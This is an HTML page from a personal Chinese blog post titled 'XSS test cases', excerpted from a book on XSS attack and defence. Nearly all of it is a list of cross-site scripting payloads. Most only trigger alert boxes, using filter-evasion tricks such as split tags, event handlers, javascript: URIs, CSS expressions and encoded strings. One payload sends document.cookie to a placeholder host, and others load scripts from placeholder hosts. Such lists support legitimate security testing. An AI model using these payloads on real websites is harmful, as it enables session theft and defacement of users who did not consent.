@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>xss测试用例 - Hi~Roy!</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="xss测试用例" />
+<meta property="og:description" content="摘录于《XSS跨站脚本攻击剖析与防御》，希望大家支持正版，写的还是不错的。
+&lt;script&gt;alert(1);&lt;/script&gt; &lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt; &lt;script src=&#34;xxx://xxx.xxx&#34;&gt;&lt;/script&gt; &lt;script&gt;location.href=&#34;xxx://xxx.xx/cookie=&#34;&#43;escape(document.cookie)&lt;/script&gt; &lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;);&lt;/scr&lt;script&gt;ipt&gt; &lt;script&gt;alert(String." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/xss%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B/" />
+<meta property="article:published_time" content="2014-12-10T21:43:58+00:00" />
+<meta property="article:modified_time" content="2014-12-10T21:43:58+00:00" />
+
+		<meta itemprop="name" content="xss测试用例">
+<meta itemprop="description" content="摘录于《XSS跨站脚本攻击剖析与防御》，希望大家支持正版，写的还是不错的。
+&lt;script&gt;alert(1);&lt;/script&gt; &lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt; &lt;script src=&#34;xxx://xxx.xxx&#34;&gt;&lt;/script&gt; &lt;script&gt;location.href=&#34;xxx://xxx.xx/cookie=&#34;&#43;escape(document.cookie)&lt;/script&gt; &lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;);&lt;/scr&lt;script&gt;ipt&gt; &lt;script&gt;alert(String.">
+<meta itemprop="datePublished" content="2014-12-10T21:43:58&#43;00:00" />
+<meta itemprop="dateModified" content="2014-12-10T21:43:58&#43;00:00" />
+<meta itemprop="wordCount" content="154">
+
+
+
+<meta itemprop="keywords" content="" />
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	<link rel="stylesheet" href="/css/roy.css">
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-81207387-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo logo--mixed">
+		<a class="logo__link" href="/" title="Roy&#39;s Blog" rel="home">
+			<div class="logo__item logo__imagebox">
+					<img class="logo__img" src="/images/logo.png">
+				</div><div class="logo__item logo__text">
+					<div class="logo__title">Roy&#39;s Blog</div>
+					<div class="logo__tagline">From the moment I first saw you, All the darkness turned to light.</div>
+				</div>
+		</a>
+	</div>
+		
+<nav class="menu">
+	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
+		<span class="menu__btn-title" tabindex="-1">Menu</span>
+	</button>
+	<ul class="menu__list">
+		<li class="menu__item">
+			<a class="menu__link" href="/">
+				
+				<span class="menu__text">Home</span>
+				
+			</a>
+		</li>
+	</ul>
+</nav>
+
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">xss测试用例</h1>
+			<div class="post__meta meta"><div class="meta__item-author meta__item">
+	<svg class="meta__icon icon icon-author" width="16" height="16" viewBox="0 0 12 16"><path d="M6 1c2.2 0 3.5 2 3.5 4.5C9.5 7 8.9 8.2 8 9c2.9.8 4 2.5 4 5v1H0v-1c0-2.5 1.1-4.2 4-5-.9-.8-1.5-2-1.5-3.5C2.5 3 3.8 1 6 1z"/></svg><span class="meta__text">Roy</span>
+</div>
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class="meta__text" datetime="2014-12-10T21:43:58Z">2014-12-10</time></div></div>
+		</header><div class="content post__content clearfix">
+			<p>摘录于《XSS跨站脚本攻击剖析与防御》，希望大家支持正版，写的还是不错的。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>);<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;xss&#39;</span>);<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xxx://xxx.xxx&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xxx://xxx.xx/cookie=&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">escape</span>(document.<span style="color:#a6e22e">cookie</span>)<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">scr</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">ipt</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;xss&#39;</span>);<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/scr&lt;script&gt;ipt&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(String.<span style="color:#a6e22e">fromCharCode</span>(<span style="color:#ae81ff">88</span>,<span style="color:#ae81ff">83</span>,<span style="color:#ae81ff">83</span>))<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#a6e22e">xx</span>.<span style="color:#a6e22e">png</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">/xss/</span>) <span style="color:#f92672">/&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">style</span><span style="color:#f92672">&gt;</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">im</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">&#39;\ja\vasc\ript:alert(\&#34;xss\&#34;);&lt;/style&gt;
+</span><span style="color:#e6db74">&lt;?echo(&#39;</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">scr</span>)<span style="color:#e6db74">&#39;;echo(&#39;</span><span style="color:#a6e22e">ipt</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;xss\&#34;)&lt;/script&gt;&#39;);?&gt;
+</span><span style="color:#e6db74">&lt;marquee&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;/marquee&gt;
+</span><span style="color:#e6db74">&lt;IMG SRC=\&#34;jav&amp;#x09;ascript:alert(&#39;xss&#39;);\&#34;&gt;
+</span><span style="color:#e6db74">&lt;IMG SRC=\&#34;jav&amp;#x0A;ascript:alert(&#39;xss&#39;);\&#34;&gt;
+</span><span style="color:#e6db74">&lt;IMG SRC=\&#34;jav&amp;#x0D;ascript:alert(&#39;xss&#39;);\&#34;&gt;
+</span><span style="color:#e6db74">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
+</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">xxx</span>.<span style="color:#a6e22e">xxx</span>.<span style="color:#a6e22e">js</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/title&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/textarea&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">IMG</span> <span style="color:#a6e22e">LOWSRC</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;javascript:alert(&#39;xss&#39;)\&#34;&gt;
+</span><span style="color:#e6db74">&lt;IMG OYNSRC=\&#34;javascript:alert(&#39;xss&#39;)\&#34;&gt;
+</span><span style="color:#e6db74">&lt;font style=&#39;color:expression(alert(document.cookie))&#39;&gt;
+</span><span style="color:#e6db74">&#39;);alert(&#39;xss
+</span><span style="color:#e6db74">&lt;img src=&#34;</span><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;xss&#39;</span>)<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">&lt;script language=&#34;</span><span style="color:#a6e22e">JavaScript</span><span style="color:#e6db74">&#34;&gt;alert(&#39;xss&#39;)&lt;/script&gt;
+</span><span style="color:#e6db74">[url=javascript:alert(&#39;xss&#39;);]click me[/url]
+</span><span style="color:#e6db74">&lt;body onunload=&#34;</span><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;xss&#39;</span>);<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">&lt;body onLoad=&#34;</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;xss&#39;</span>);<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">[color=red&#39; onmouserover=&#34;</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;xss&#39;</span>)<span style="color:#e6db74">&#34;]mouser over[/color]
+</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">/&gt;&lt;</span><span style="color:#e6db74">/a&gt;&lt;/</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1.</span><span style="color:#a6e22e">gif</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">&gt;</span>
+window.<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;xss&#34;</span>);
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">div</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x:expression((window.r==1)?&#34;</span>eval(<span style="color:#e6db74">&#39;r=1;alert(String.fromCharCode(88,83,83));&#39;</span>))<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">&lt;iframe&lt;?php echo chr(11)?&gt;onload=alert(&#39;xss&#39;)&gt;&lt;/iframe&gt;
+</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">alert</span>(String.<span style="color:#a6e22e">fromCharCode</span>(<span style="color:#ae81ff">88</span>,<span style="color:#ae81ff">83</span>,<span style="color:#ae81ff">83</span>))<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+<span style="color:#e6db74">&#39;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;xss&lt;/h1&gt;&lt;/marquee&gt;
+</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#34;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;xss&lt;/h1&gt;&lt;/marquee&gt;
+</span><span style="color:#e6db74">&#39;&#34;</span><span style="color:#f92672">&gt;&gt;&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;xss&#39;</span>)<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">META</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">-</span><span style="color:#a6e22e">EQUIV</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;refresh\&#34; CONTENT=\&#34;0;url=javascript:alert(&#39;xss&#39;);\&#34;&gt;
+</span><span style="color:#e6db74">&lt;META HTTP-EQUIV=\&#34;refresh\&#34; CONTENT=\&#34;0;URL=http://;URL=javascript:alert(&#39;xss&#39;);\&#34;&gt;
+</span><span style="color:#e6db74">&lt;script&gt;var var = 1:alert(var)&lt;/script&gt;
+</span><span style="color:#e6db74">&lt;STYLE type=&#34;</span><span style="color:#a6e22e">text</span><span style="color:#f92672">/</span><span style="color:#a6e22e">css</span><span style="color:#e6db74">&#34;&gt;BODY{background:url(&#34;</span><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;xss&#39;</span>)<span style="color:#e6db74">&#34;)}&lt;/STYLE&gt;
+</span><span style="color:#e6db74">&lt;?=&#39;&lt;SCRIPT&gt;alert(&#34;</span><span style="color:#a6e22e">xss</span><span style="color:#e6db74">&#34;)&lt;/SCRIPT&gt;&#39;?&gt;
+</span><span style="color:#e6db74">&lt;IMG SRC=&#39;vbscript:msgbox(\&#34;xss\&#34;)&#39;&gt;
+</span><span style="color:#e6db74">&#34;</span><span style="color:#a6e22e">onfocus</span><span style="color:#f92672">=</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;xss&#34;</span>)<span style="color:#e6db74">&#34;&gt;&lt;&#34;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">FRAMESET</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">FRAME</span> <span style="color:#a6e22e">SRC</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;javascript:alert(&#39;xss&#39;);\&#34;&gt;&lt;/FRAMESET&gt;
+</span><span style="color:#e6db74">&lt;STYLE&gt;li{list-style-image:url(\&#34;javascript:alert(&#39;xss&#39;)\&#34;);}&lt;/SYTLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+</span><span style="color:#e6db74">&lt;br size=\&#34;&amp;{alert(&#39;xss&#39;)}\&#34;&gt;
+</span><span style="color:#e6db74">&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;
+</span><span style="color:#e6db74">&lt;/br style=a:expression(alert(1))&gt;
+</span><span style="color:#e6db74">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">BODY</span> <span style="color:#a6e22e">onload</span><span style="color:#f92672">!</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">$</span><span style="color:#f92672">%&amp;</span>()<span style="color:#f92672">*~+-</span><span style="color:#a6e22e">_</span>.,<span style="color:#f92672">:</span>;<span style="color:#f92672">?</span><span style="color:#960050;background-color:#1e0010">@</span>[<span style="color:#960050;background-color:#1e0010">/|\]^`=alert(&#34;xss&#34;)&gt;</span>
+[<span style="color:#a6e22e">color</span><span style="color:#f92672">=</span><span style="color:#a6e22e">red</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#a6e22e">expression</span>(<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">123</span>))][<span style="color:#a6e22e">color</span>]
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">BASE</span> <span style="color:#a6e22e">HREF</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:alert(&#39;xss&#39;);//&#34;</span><span style="color:#f92672">&gt;</span>
+<span style="color:#a6e22e">Excute</span>(<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">MsgBox</span>(<span style="color:#a6e22e">chr</span>(<span style="color:#ae81ff">88</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">chr</span>(<span style="color:#ae81ff">83</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">chr</span>(<span style="color:#ae81ff">83</span>)))<span style="color:#f92672">&lt;</span>
+<span style="color:#e6db74">&#34;&gt;&lt;/iframe&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</span><span style="color:#e6db74">&lt;body onLoad=&#34;</span><span style="color:#66d9ef">while</span>(<span style="color:#66d9ef">true</span>) <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;xss&#39;</span>);<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">&#39;&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/title&gt;&lt;script&gt;alert(111)&lt;/script&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/textarea&gt;&#39;&#34;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>
+<span style="color:#e6db74">&#39;&#34;&#34;&gt;&lt;script language=&#34;JavaScript&#34;&gt;alert(x \nS \nS);&lt;/script&gt;
+</span><span style="color:#e6db74">&lt;/script&gt;&lt;/script&gt;&lt;&lt;&lt;&lt;script&gt;&lt;&gt;&gt;&gt;&gt;&lt;&lt;&lt;script&gt;alert(123)&lt;/script&gt;
+</span><span style="color:#e6db74">&lt;html&gt;&lt;noalert&gt;&lt;noscript&gt;(123)&lt;/noscript&gt;&lt;script&gt;(123)&lt;/script&gt;
+</span><span style="color:#e6db74">&lt;INPUT TYPE=&#34;IMAGE&#34; SRC=&#34;javascript:alert(&#39;</span><span style="color:#a6e22e">xss</span><span style="color:#e6db74">&#39;);&#34;&gt;
+</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">+</span><span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&gt;&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://xx.xx/xx.js&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+<span style="color:#e6db74">&#39;&gt;&#34;&gt;&lt;script src = &#34;xxx.xxx/xss.js&#34;&gt;&lt;/script&gt;
+</span><span style="color:#e6db74">}&lt;/style&gt;&lt;script&gt;a=eval;b=alert;a(b(/xss/.source));&lt;/script&gt;
+</span><span style="color:#e6db74">&lt;SCRIPT&gt;document.write(&#34;xss&#34;)&lt;/SCRIPT&gt;
+</span><span style="color:#e6db74">a=&#34;get&#34;;b=&#34;URL&#34;;c=&#34;javascript:&#34;;d=&#34;alert(&#39;</span><span style="color:#a6e22e">xss</span><span style="color:#e6db74">&#39;);&#34;;eval(a+b+c+d);
+</span><span style="color:#e6db74">=&#39;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;xss&#34;</span>)<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">body</span> <span style="color:#a6e22e">background</span><span style="color:#f92672">=</span><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;&#34;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&gt;&lt;/body&gt;
+</span><span style="color:#e6db74">&#34;&gt;/XaDos/&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script src=&#34;xxxx.xxxx/xx.js&#34;&gt;&lt;/script&gt;
+</span><span style="color:#e6db74">Data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlenQoMTMzNyk8L3NjcmlwdD4=  
+</span><span style="color:#e6db74">上面的解密后   &#34;&gt;&lt;/title&gt;&lt;script&gt;alert(1337)&lt;/script&gt; 注意utf-7
+</span><span style="color:#e6db74">&#34;&lt;marquee&gt;&lt;img src=x.png onerror=alert(1)/&gt;
+</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#34;&gt;&lt;marquee&gt;&lt;img src=x.png onerror=alert(1)/&gt;
+</span><span style="color:#e6db74">&lt;/div&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;javascript:alert(1)&#39;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/iframe&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">div</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;background:url(&#39;javascript:alert(1)&#39;)&#34;</span><span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;java\nscript:alert(1)&#39;</span><span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&gt;</span><span style="color:#e6db74">&#34;&#39;&gt;&lt;img src=&#34;</span><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;background:url(javascript:alert(/xss/))&#34;</span>
+<span style="color:#f92672">&gt;</span><span style="color:#e6db74">&#34;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;
+</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span>
+<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#e6db74">&#34;&lt;/title&gt;&lt;font color=red onmouseover=javascript:alert(1)&gt;xss&lt;/font&gt;
+</span><span style="color:#e6db74">&lt;SELECT NAME=&#34;</span><span style="color:#960050;background-color:#1e0010">&#34;</span> <span style="color:#a6e22e">onmouerover</span><span style="color:#f92672">=</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/select&gt;</span>
+</code></pre></div>
+		</div>
+	</article>
+</main>
+
+<div class="authorbox clearfix">
+	<figure class="authorbox__avatar">
+		<img alt="Roy avatar" src="/images/my.jpg" class="avatar" height="90" width="90">
+	</figure>
+	<div class="authorbox__header">
+		<span class="authorbox__name">About Roy</span>
+	</div>
+	<div class="authorbox__description">
+		野生程序猿，略懂Python，略懂Golang，略懂云计算，略懂大数据，略懂拳击游泳钓鱼，略懂钢琴吉他摄影。
+	</div>
+</div>
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/%E4%B8%8D%E5%8F%AF%E8%A2%AB%E8%AF%81%E6%98%8E%E7%9A%84%E7%88%B1/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">不可被证明的爱</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/fedora21%E5%BC%80%E6%9C%BA%E6%89%A7%E8%A1%8C%E6%9F%90%E5%91%BD%E4%BB%A4/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">fedora21开机执行某命令</p>
+		</a>
+	</div>
+</nav>
+
+<section class="comments">
+	<div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "www-hi-roy-com" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+<div class="footer__links">
+	<a class="footer__link" href="/about/">About</a>
+</div>
+		<div class="footer__copyright">
+			&copy; 2024 Roy.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
